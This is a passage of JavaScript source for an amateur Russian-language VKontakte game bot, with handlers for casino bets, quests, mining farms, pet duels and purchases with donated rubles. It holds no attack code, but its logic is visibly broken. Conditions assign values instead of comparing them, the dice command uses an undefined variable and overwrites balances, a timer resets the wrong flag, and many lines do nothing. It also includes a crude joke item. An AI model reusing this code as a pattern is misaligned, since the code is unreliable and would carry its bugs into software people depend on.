			return message.send(`👓 Вам выпало 8.000.000 $ !`);
		}
		if(rez == 17){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 18){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
		if(rez == 19){
			let text = [].random(); 
			user.balance += 0;
			return message.send(`Вы проиграли ((`);
		}
	}); 
	vk.updates.hear(/^(?:Квыполнить)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.upis10 < 30) return message.send(`👳 Братан ! Тебе нужн ограбить 30 инкассаторских машин !`);
		user.upis10 -= 30;
		user.balance += 50000000;
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`👳 Держи 50.000.000 $ !`);
		}else{ 
			let count = [0].random();
			user.balance += count;
			return message.send(`👳 Держи 50.000.000 $ !`);
		}
	});   
	vk.updates.hear(/^(?:кновичок)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.kvest1 == true) return message.send(`💻 Данный квест уже выполнен !`);
		if(user.kkk < 5) return message.send(`💻 Сначала пригласите 5 друзей , чтобы выполнить данный квест !`);
		user.kkk -= 5;
		user.kvest1 = true;
		user.balance += 1500000;
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`💸 Вы получили 1.500.000 $`);
		}else{ 
			let count = [0].random();
			user.balance += count;
			return message.send(`💸 Вы получили 1.500.000 $`);
		}
	});  
	vk.updates.hear(/^(?:казарт)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.kvest2 == true) return message.send(`💻 Данный квест уже выполнен !`);
		if(user.upis1 < 100) return message.send(`💻 Сначала сыиграйте 100 раз в казино , чтобы выполнить данный квест !`);
		user.kvest2 = true;
		user.balance += 1500000;
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`💸 Вы получили 1.500.000 $`);
		}else{ 
			let count = [0].random();
			user.balance += count;
			return message.send(`💸 Вы получили 1.500.000 $`);
		}
	});  
	vk.updates.hear(/^(?:кубийца)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.kvest3 == true) return message.send(`💻 Данный квест уже выполнен !`);
		if(user.upis2 < 25) return message.send(`💻 Сначала убейте 25 юзеров , чтобы выполнить данный квест !`);
		user.kvest3 = true;
		user.balance += 3500000;
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`💸 Вы получили 3.500.000 $`);
		}else{ 
			let count = [0].random();
			user.balance += count;
			return message.send(`💸 Вы получили 3.500.000 $`);
		}
	}); 
	vk.updates.hear(/^(?:buyferm)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.vfb == true) return message.send(`♻ У вас уже есть майнинг ферма !`)
			if(user.balance < 80000000) return message.send(`💣 ➾ У вас не хватает 80.000.000 !$`)
				user.balance -= 80000000;
			user.vfb = true;
			let rez = [true, false].random();
			if(rez == false){
				let text = [].random(); 
				user.balance -= 0;
				return message.send(`📊 Вы купили майнинг ферму " теплые яйца ". Чтобы посмотреть команды, напиши  " фхелп "`);
			}else{ 
				let count = [0].random();
				user.balance += count;
				return message.send(`📊 Вы купили майнинг ферму " теплые яйца ". Чтобы посмотреть команды, напиши  " фхелп "`);
			}
		}); 
	vk.updates.hear(/^(?:buyferm2)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.vfb == true) return message.send(`♻ У вас уже есть майнинг ферма !`)
			if(user.balance < 10000000000) return message.send(`💣 ➾ У вас не хватает 10.000.000.000 !$`)
				user.balance -= 10000000000;
			user.vfb = true;
			let rez = [true, false].random();
			if(rez == false){
				let text = [].random(); 
				user.balance -= 0;
				return message.send(`📊 Вы купили майнинг ферму " ядро ". Чтобы посмотреть команды, напиши  " фхелп2 "`);
			}else{ 
				let count = [0].random();
				user.balance += count;
				return message.send(`📊 Вы купили майнинг ферму " ядро ". Чтобы посмотреть команды, напиши  " фхелп2 "`);
			}
		}); 
	vk.updates.hear(/^(?:фпродать)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.vfb == false) return message.send(`⚡ У тебя нет майнинг фермы !`)
			user.balance += 30000000;
		user.vfb = false;
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`♻ Вы продали майнинг  ферму !`);
		}else{ 
			let count = [0].random();
			user.balance += count;
			return message.send(`♻ Вы продали майнинг  ферму !`);
		}
	}); 
	vk.updates.hear(/^(?:собрать)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.vfb == false) return message.send(`💿 У вас нет майнинг - фермы !`)
			if(user.bloks.baza == true) return message.send(`⚡ Ферма нечего еще не принесла ! Попробуйте через 1 час !`);
		user.bloks.baza = true
		setTimeout(() => {
			user.bloks.baza = false
			vk.api.call('messages.send', {
				peer_id: user.id,
				message: `💸⚡ Ваша майнинг - ферма принесла Вам биткоины ! Чтобы собрать, напиши " собрать "` , random_id: 0
			});
		}, 3600000);
		let rez = [false].random();
		if(rez == false){
			let count = [1,34,564,434,6,87,123,657,899,766,111,788,999,545,145,654,899,434,784,4,5,6,7,8,9,1,54,78,999,11,445,888,999,111,222,333,677,666,786].random();
			user.bitcoin += count;
			return message.send(`⚡ Ваша ферма , принесла Вам ${count} биткоинов !`);
		}
	});
	vk.updates.hear(/^(?:взаработать)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.bloks.sssss4 == true) return message.send(`⚠ Зарабатывать VK COINS можно раз в 3 часа !`);
		user.bloks.sssss4 = true
		setTimeout(() => {
			user.bloks.yunet = false
		}, 10800000);
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.upis14 += 500;
			return message.send(`Вы заработали 500 VK COINS !`);
		}else{ 
			let count = [1,200,300,400,500,100,250,5000,700,800,1000,2000,300,10,20,300,50,700,70,80].random();
			user.upis14 += count;
			return message.send(`Вы заработали: ${count}$ VK COINS`);
		}
	}); 

	vk.updates.hear(/^(?:Вкосмос)/i, (message) => { 
		let user = acc.users[user_id(message.user)];
		if(user.upis65465465 < 30) return message.send(`❗ Доступно с 30 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
		if(user.bloks.yunet == true) return message.send(`🌍 Через 4 часа можете снова полететь !`);
		user.bloks.yunet = true
		setTimeout(() => {
			user.bloks.yunet = false
		}, 14400000);
		if(user.balance < 500000000) return message.send(`⚠ У вас нет 500.000.000 $ !`);
		let rez = [true, false].random();
		if(rez == false){
			let text = [].random(); 
			user.balance -= 0;
			return message.send(`☄ Увы, вы нечего не нашли в космосе `);
		}else{ 
			let count = [1,2,1,1,1,4,5,7,8,9,1,6,7,8,9,11,6,1,6,1,0,0].random();
			user.aaa += count;
			return message.send(`☄ Вы нашли ${count}$ метеорита\n🌍 Обменяйте его на деньги ! Один метеорит - 100.000.000 $ ! Чтобы обменять, напишите " мобменять [количество] "`);
		}
	}); 
///////////////////////Рулетка
	/////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////ФАРТУНА
/////////////////////////////////////
vk.updates.hear(/^(?:!шар)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true].random();
	if(rez == false){
	}else{ 
		let count = ['я думаю что да','конечно','не','да да','неее','конечно нет','ну да','я думаю что да'].random();
		return message.send(`🌚 ${count}`);
	}
}); 

vk.updates.hear(/^(?:!;)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true].random();
	if(rez == false){
	}else{ 

		return message.reply(`😃 Думаю что через ${rand(1,999999)} дней`);
	}
}); 
vk.updates.hear(/^(?:лтест)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	let rez = [true].random();
	if(rez == false){
	}else{ 

		return message.reply(`👩‍⚕💖 Тест показал, вас любит ID ${rand(1,500)}`);
	}
});


vk.updates.hear(/^(?:Поткрыть)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	user.banan17 = false;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		return message.send(`✅ Вы успешно открыли свой профиль !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`✅ Вы успешно открыли свой профиль !`);
	}
});
vk.updates.hear(/^(?:Пзакрыть)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	user.banan17 = true;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		return message.send(`✅ Вы успешно закрыли свой профиль !`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`✅ Вы успешно закрыли свой профиль !`);
	}
});
vk.updates.hear(/^(?:тир)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 3) return message.send(`❗ Доступно с 3 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.gun_name == false)	 return message.send(`🔫 ➾ У вас нет оружия. ('Крутить')`)
		if(user.balance < 10000) return message.send(`💣 ➾ У вас не хватает 10.000 !$`);
	user.balance -= 10000;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 10000;
		return message.send(`Вы не попали и проиграли $ (((`);
	}else{ 
		let count = [15000,11000,12000,14000].random();
		user.balance += count;
		return message.send(`🔫 Вы попали !\n👒 ➾ Вы получили ${count}$`);
	}
});  
vk.updates.hear(/^(?:джекпот)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.upis65465465 < 8) return message.send(`❗ Доступно с 8 уровня. Ваш уровень маловат. ❗ Подробнее, напишите " лвлап " `);
	if(user.balance < 500000) return message.send(`У вас нет 500.000  $`);
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance -= 500000;
		return message.send(`Вы проиграли 500.000 (((`);
	}else{ 
		let count = [1000000].random();
		user.balance += count;
		return message.send(`Вы выиграли 1.000.000 $`);
	}
});  


vk.updates.hear(/^(?:!ас)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	user.bank = 0;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`Баланс банка обнулился ! Можете продолжать пользоваться банком!`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Баланс банка обнулился ! Можете продолжать пользоваться банком!`);
	}
}); 		



vk.updates.hear(/^(?:Мснять)/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.pir == false) return message.send(`На вас не одета маска позора !`);
	let rez = [true, false].random(); 
	if(rez == false){
		let text = [].random(); 
		user.pir = false;
		return message.send(`Вы удачно сняли маску !`);
	}else{ 
		let count = [0].random();
		user.balance = count;
		return message.send(`Вам не п`);
	}
});
vk.updates.hear(/^(?:кубик)\s?([0-9]+)?\s([^\s	].*)/i, message => {  
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1] || !message.$match[2] || !Number(i)|| !Number(message.$match[1]) || message.$match[1] > 6 ) return message.send(`🎲 ➾ Пример ввода: 'Кубик [1-6] [ставка]`);
	let rez = [1,2,3,4,5,6].random(); 
	if(rez == message.$match[2]){
		let text = [].random(); 
		user.balance += 2*Number(message.$match[2]);
		return message.send(`🤴 Поздравляем ! Вы выиграли !`);
	}else{ 
		user.balance = Number(message.$match[2]);
		return message.send(`Вы проиграли!`);
	}
});


vk.updates.hear(/^(?:dsadsa)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.chat = 1) return message.send(`У вас уже включен чат ! Выключить командой " blas "`);
	user.chat = 1;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`Чат вкл ! Чтобы отключить, напишите " blas "`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Чат вкл ! Чтобы отключить, напишите " blas "`);
	}
}); 
vk.updates.hear(/^(?:blas)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.chat = 0) return message.send(`У вас уже выключен чат ! Включить командой " vkla "`);
	user.chat = 0;
	let rez = [true, false].random();
	if(rez == false){
		let text = [].random(); 
		user.balance += 0;
		return message.send(`Чат выкл ! Чтобы вкл, напишите " vkla "`);
	}else{ 
		let count = [0].random();
		user.balance += count;
		return message.send(`Чат выкл ! Чтобы вкл, напишите " vkla "`);
	}
});

/////ПИТОМБОЙ
vk.updates.hear(/^(?:бойп654654654456ит)\s?([0-9]+)?\s?([0-9]+)?/i, message => {

	let args = message.$match[1];
	let user = acc.users[user_id(message.user)];
	if(acc.users[args].pit == false) return message.send(`🐻 У игрока нет питомца!`)
		if(user.pit == false)	 return message.send(`🐻 У вас нет питомца !`)
			if(args == user_id(message.user)) return message.send(` ➾ Вы указали свой ID`)
				if(!message.$match[2] || !args || message.$match[2] < 1) return message.send(`🐻 ➾ Пример команды: 'бойпит ID СТАВКА'`)
					if(user.balance < message.$match[2]) return message.send(`🐻 ➾ Ваша ставка больше вашего баланса`)
						if(!acc.users[args]) return message.send(`🐻 ➾ Такого игрока нет!`)
							if(acc.users[args].balance < message.$match[2]) return message.send(`🐻 ➾ У игрока баланс меньше вашей ставки`)
								if(user.volftube5 != false) return message.send(`🐻 ➾ Вы уже назначали бой игроку ${acc.users[user.duel].prefix}\n🎌 ➾ Для отмены напишите: 'питомец сдаюсь'`);
							if(acc.users[args].volftube5 != false) return message.send(`🐻  ➾ Вы уже назначали стрелу игроку ${acc.users[user.duel].prefix}\n&#127987; ➾ Для отмены напишите: 'питомец сдаюсь'`);
							user.mur = Number(message.$match[2]);
							acc.users[args].mur = Number(message.$match[2]);
							user.volftube5 = Number(args);
							acc.users[args].volftube5 = Number(user_id(message.user));
							user.oo = user_id(message.user);
							acc.users[args].oo =  user_id(message.user);

							vk.api.call("messages.send", {
								peer_id: acc.users[message.$match[1]].id,
								message: `
								🐻 ➾ Игрок @id${user.id}(${user.prefix}) назначил вам бой питомцев !
								🐻 ➾ Ставка ${message.$match[2]}$

								🐻 ➾ Для принятия напишите: 'питпринять'
								🐻 ➾ Для отмены напишите: 'питомец сдаюсь'
								`, random_id: 0
							}).then((res) => {}).catch((error) => {console.log('duel error'); });	

							return message.send(`
								🐻 ➾ Вы назначили бой питомцев игроку @id${acc.users[args].id}(${acc.users[args].prefix})
								🐻 ➾ Ставка ${message.$match[2]}$
								🐻 ➾ Ожидайте принятия боя игроком.

								&#127987; ➾ Для отмены напишите: 'питомец сдаюсь'
								`);
						});
//////////////////////////////

/////////////////////////////

vk.updates.hear(/^(?:питпринять)/i, message => {

	let args = message.$match[1];
	let user = acc.users[user_id(message.user)];
	if(user.volftube5 == false) return message.send(`🐻 ➾ Вам не назначали бой питомцев!`); 
	if(user.balance < user.summ) return message.send(`🐻 ➾ Ставка больше вашего баланса`)
		if(acc.users[user.volftube5].balance < message.$match[2]) return message.send(`🐻 ➾ У противника баланс меньше ставки`) 
			if(user_id(message.user) == user.oo) return message.send(`🐻 ➾ Принять бой должен соперник!`);

		let sum = user.mur;  
		let us2 = user.volftube5;
	let one_hp = 100; //кто принимает
	let two_hp = 100; //кто атакует
	let text = '';

	//1 этап
	one_hp -= acc.users[user.volftube5].conus;
	two_hp -= user.conus;
	text += `
	- - 1&#8419; этап - - 
	🐻 ➾ ${user.prefix} | -${acc.users[user.volftube5].conus}% | ${one_hp}❤
	🐻 ➾ ${acc.users[user.volftube5].prefix} | -${user.conus}% | ${two_hp}❤ 
	`;
	// 2 этап
	one_hp -= acc.users[user.volftube5].conus;
	two_hp -= user.conus;
	if(one_hp <= 0 || two_hp <= 0){
		if(one_hp <= 0 && two_hp <= 0){
			if(rand(1,2) == 1){
				if(one_hp <= 0){
					// победил второй
					user.balance -= Number(user.mur);
					acc.users[user.volftube5].balance += Number(user.mur);

					user.game.strela_loose += 1; 
					acc.users[us2].game.strela_win += 1;

					text += `
					- - Финал - - 
					🐻 ➾ В финальном этапе победил питомец игрока @id${acc.users[us2].id}(${acc.users[us2].prefix})
					🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | 0❤ xp питомец
					🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤  xp питомец
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].volftube5 = false;
					acc.users[us2].mur = false; 
					user.volftube5 = false;
					user.mur = false;
					acc.users[us2].oo = false;
					user.oo = false; 

					return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
				}
				if(two_hp <= 0){
					// победил первый
					user.balance += Number(user.mur);
					acc.users[us2].balance -= Number(user.mur);

					user.game.strela_win += 1;  
					acc.users[us2].game.strela_loose += 1;

					text += `
					- - Финал - - 
					🐻 ➾ В финальном этапе победил питомец игрока @id${user.id}(${user.prefix})
					🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤ xp питомца
					🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | 0❤ xp питомца
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].volftube5 = false;
					acc.users[us2].mur = false; 
					user.volftube5 = false;
					user.mur = false;
					acc.users[us2].oo = false;
					user.oo = false;  

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
			}
		}
		if(two_hp <= 0){
				// победил первый
				user.balance += Number(user.mur);
				acc.users[us2].balance -= Number(user.mur);

				user.game.strela_win += 1;  
				acc.users[us2].game.strela_loose += 1;

				text += `
				- - Финал - - 
				🐻 ➾ В финальном этапе победил питомец игрока @id${user.id}(${user.prefix})
				🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤ xp питомца
				🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | 0❤ xp питомца
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0

				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].volftube5 = false;
				acc.users[us2].mur = false; 
				user.volftube5 = false;
				user.mur = false;
				acc.users[us2].oo = false;
				user.oo = false;  

				return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
			}
			if(one_hp <= 0){
				// победил второй
				user.balance -= Number(user.mur);
				acc.users[user.volftube5].balance += Number(user.mur);

				user.game.strela_loose += 1; 
				acc.users[us2].game.strela_win += 1;

				text += `
				- - Финал - - 
				🐻 ➾ В финальном этапе победил питомец игрока @id${acc.users[us2].id}(${acc.users[us2].prefix})
				🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | 0❤ xp питомец
				🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤  xp питомец
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0

				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].volftube5 = false;
				acc.users[us2].mur = false; 
				user.volftube5 = false;
				user.mur = false;
				acc.users[us2].oo = false;
				user.oo = false; 

				return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
			} 

		}else{
			text += `
			- - 2&#8419; этап - - 
			🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤
			🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤ 
			`;
		} 
	// 3 этап
	one_hp -= acc.users[user.volftube5].conus;
	two_hp -= user.conus;
	if(one_hp <= 0 || two_hp <= 0){
		if(one_hp <= 0 && two_hp <= 0){
			if(rand(1,2) == 1){
				if(one_hp <= 0){
					// победил второй
					user.balance -= Number(user.mur);
					acc.users[user.volftube5].balance += Number(user.mur);

					user.game.strela_loose += 1; 
					acc.users[us2].game.strela_win += 1;

					text += `
					- - Финал - - 
					🐻 ➾ В финальном этапе победил питомец игрока @id${acc.users[us2].id}(${acc.users[us2].prefix})
					🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | 0❤ xp питомец
					🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤  xp питомец
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].volftube5 = false;
					acc.users[us2].mur = false; 
					user.volftube5 = false;
					user.mur = false;
					acc.users[us2].oo = false;
					user.oo = false; 

					return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
				}
				if(two_hp <= 0){
					// победил первый
					user.balance += Number(user.mur);
					acc.users[us2].balance -= Number(user.mur);

					user.game.strela_win += 1;  
					acc.users[us2].game.strela_loose += 1;

					text += `
					- - Финал - - 
					🐻 ➾ В финальном этапе победил питомец игрока @id${user.id}(${user.prefix})
					🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤ xp питомца
					🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | 0❤ xp питомца
					`;
					vk.api.call("messages.send", {
						user_id: user.id,
						message: text, random_id: 0
						
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

					vk.api.call("messages.send", {
						user_id: acc.users[us2].id,
						message: text, random_id: 0
					}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
					acc.users[us2].volftube5 = false;
					acc.users[us2].mur = false; 
					user.volftube5 = false;
					user.mur = false;
					acc.users[us2].oo = false;
					user.oo = false;  

					return message.send(`🔫 ➾ Результат боя отправлен вам в ЛС.`);			
				}
			}
		}
		if(two_hp <= 0){
				// победил первый
				user.balance += Number(user.mur);
				acc.users[us2].balance -= Number(user.mur);

				user.game.strela_win += 1;  
				acc.users[us2].game.strela_loose += 1;

				text += `
				- - Финал - - 
				🐻 ➾ В финальном этапе победил питомец игрока @id${user.id}(${user.prefix})
				🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤ xp питомца
				🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | 0❤ xp питомца
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0

				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].volftube5 = false;
				acc.users[us2].mur = false; 
				user.volftube5 = false;
				user.mur = false;
				acc.users[us2].oo = false;
				user.oo = false;  

				return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
			}
			if(one_hp <= 0){
				// победил второй
				user.balance -= Number(user.mur);
				acc.users[user.volftube5].balance += Number(user.mur);

				user.game.strela_loose += 1; 
				acc.users[us2].game.strela_win += 1;

				text += `
				- - Финал - - 
				🐻 ➾ В финальном этапе победил питомец игрока @id${acc.users[us2].id}(${acc.users[us2].prefix})
				🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | 0❤ xp питомец
				🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤  xp питомец
				`;
				vk.api.call("messages.send", {
					user_id: user.id,
					message: text, random_id: 0

				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	

				vk.api.call("messages.send", {
					user_id: acc.users[us2].id,
					message: text, random_id: 0
				}).then((res) => {}).catch((error) => {console.log('duel(ataka) error'); });	
				acc.users[us2].volftube5 = false;
				acc.users[us2].mur = false; 
				user.volftube5 = false;
				user.mur = false;
				acc.users[us2].oo = false;
				user.oo = false; 

				return message.send(`🐻 ➾ Результат боя отправлен вам в ЛС.`);			
			} 

		}else{
			text += `
			- - 2&#8419; этап - - 
			🐻 ➾ ${user.prefix} | -${acc.users[us2].conus}% | ${one_hp}❤
			🐻 ➾ ${acc.users[us2].prefix} | -${user.conus}% | ${two_hp}❤ 
			`;
		}



	});

/////////////////////////////////
  ////////////////
  vk.updates.hear(/^(?:купить рейтинг)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`👑 ➾ Укажите количество рейтинга.`);
  	if(user.balance < message.$match[1] * 500000) return message.send(`👑 ➾ 1 рейтинг стоит 500.000$\n👑 ➾ Для покупки ${message.$match[1]}👑 нужно ${message.$match[1] * 500000}$`)
  		if(user.ap > 0) return message.send(`👑 ➾ Администрации запрещено покупать рейтинг.`)
  			user.balance -= Number(message.$match[1] * 500000);
  		user.global_exs += Number(message.$match[1]);
  		return message.send(`👑 ➾ Вы успешно купили ${message.$match[1]} рейтинга`);
  	});
  vk.updates.hear(/^(?:лвлкачать)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`➾ Укажите уровень`);
  	if(user.upis56456456 < message.$match[1] * 50) return message.send(`➾ 1 уровень стоит 50 опыта\nДля апа ${message.$match[1]}лвл нужно ${message.$match[1] * 50} опыта`)
  		user.upis56456456 -= Number(message.$match[1] * 50);
  	user.upis65465465 += Number(message.$match[1]);
  	return message.send(` ➾ Вы успешно прокачали ${message.$match[1]} лвл`);
  });

  vk.updates.hear(/^(?:продать рейтинг)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`👑 ➾ Укажите количество рейтинга.`);
  	if(user.global_exs < message.$match[1]) return message.send(`👑 ➾ У вас нет столько рейтинга.`)
  		user.balance += Number(message.$match[1] * 200000);
  	user.global_exs -= Number(message.$match[1]);
  	return message.send(`👑 ➾ Вы успешно продали ${message.$match[1]} рейтинга за ${message.$match[1] * 200000}$`);
  });
  vk.updates.hear(/^(?:заправка)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];
  	if(user.iv54645an228 < 10) return message.send(`Вы не на АЗС !`);

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🚾 Укажите количество бензина !`);
  	if(user.balance < message.$match[1]) return message.send(`➾ У вас нет столько денег`)
  		user.balance -= Number(message.$match[1] * 2000);
  	user.alm565in  += Number(message.$match[1]);
  	return message.send(` ➾ Вы успешно заправили свой тс на ${message.$match[1]} л за ${message.$match[1] * 2000}$`);
  });
  vk.updates.hear(/^(?:Бабочки)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🦋 ➾ Укажите количество бабочек.`);
  	if(user.almidfadfdn < message.$match[1]) return message.send(`👑🦋 ➾ У вас нет столько бабочек.`)
  		user.balance += Number(message.$match[1] * 20000);
  	user.almidfadfdn -= Number(message.$match[1]);
  	return message.send(`🦋 ➾ Вы успешно продали ${message.$match[1]} бабочек за ${message.$match[1] * 20000}$`);
  });
  vk.updates.hear(/^(?:спермапродать)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🍼 ➾ Укажите количество банок.`);
  	if(user.almindfs < message.$match[1]) return message.send(`🍼 ➾ У вас нет столько банок.`)
  		user.balance += Number(message.$match[1] * 200000);
  	user.almindfs -= Number(message.$match[1]);
  	return message.send(`🍼 ➾ Вы успешно продали ${message.$match[1]} банок спермы за ${message.$match[1] * 200000}$`);
  });
  vk.updates.hear(/^(?:мобменять)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🌍 Укажите количество метеорита !`);
  	if(user.aaa < message.$match[1]) return message.send(`🌍 У вас нет столько метеорита !`)
  		user.balance += Number(message.$match[1] * 100000000);
  	user.aaa -= Number(message.$match[1]);
  	return message.send(`🌍  ➾ Вы успешно продали ${message.$match[1]} метеорита за ${message.$match[1] * 100000000}$`);
  });
  vk.updates.hear(/^(?:buyzkeys)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🆘 Укажите кол-во кейсов !`);
  	if(user.ivan2256768ivan2256768 < message.$match[1]) return message.send(`У вас нет столько донат рублей ! ( 1 донат рублей - 1 кейс )`)
  		user.his += Number(message.$match[1] * 1);
  	user.ivan2256768ivan2256768 -= Number(message.$match[1]);
  	return message.send(`➾ Вы успешно купили ${message.$match[1]} кейса за ${message.$match[1] * 1}`);
  });
  vk.updates.hear(/^(?:buybkeys)\s?([0-9]+)?/i, message => {
  	let user = acc.users[user_id(message.user)];

  	if(!message.$match[1] || !Number(message.$match[1])) return message.send(`🆘 Укажите кол-во кейсов !`);
  	if(user.ivan2256768ivan2256768 < message.$match[1]) return message.send(`У вас нет столько донат рублей ! ( 1 донат рублей - 1 кейс )`)
  		user.volff6 += Number(message.$match[1] * 1);
  	user.ivan2256768ivan2256768 -= Number(message.$match[1]);
  	return message.send(`➾ Вы успешно купили ${message.$match[1]} бриллиантового кейса за ${message.$match[1] * 1}`);
  });
